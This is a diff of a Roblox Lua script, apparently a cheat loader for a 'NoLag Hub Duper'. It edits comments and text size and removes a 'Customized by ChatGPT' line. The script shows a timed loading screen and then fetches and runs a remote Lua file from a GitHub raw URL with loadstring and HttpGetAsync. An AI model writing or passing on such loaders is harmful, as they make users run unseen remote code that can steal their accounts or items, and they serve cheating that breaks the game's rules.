@@ -1,6 +1,5 @@
 -- NoLag Hub Loader Final Script (Mobile Optimized)
--- Includes: Welcome > Server Hop > Script Loader (1min + Spinner + Bar) > Execution
--- Customized by ChatGPT
+-- Includes: Welcome > Server Hop > NoLag Duper Loader (1min + Spinner + Bar) > Script Execution
 
 -- LocalPlayer Setup
 local player = game.Players.LocalPlayer
@@ -170,7 +169,7 @@ finalText.Position = UDim2.new(0, 0, 0, 60)
 finalText.BackgroundTransparency = 1
 finalText.Text = "LOADING NOLAG HUB DUPER PLEASE WAIT"
 finalText.TextColor3 = Color3.fromRGB(255, 255, 255)
-finalText.TextSize = 22
+finalText.TextSize = 18 -- reduced size for better fit
 finalText.Font = Enum.Font.GothamBold
 finalText.TextWrapped = true
 finalText.Parent = finalFrame
@@ -208,7 +207,6 @@ for i = 1, 30 do
 end
 finalGui:Destroy()
 
--- === EXECUTE NOLAG HUB DUPER SCRIPT ===
+-- === EXECUTE SCRIPT FROM URL ===
 task.wait(0.5)
-
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
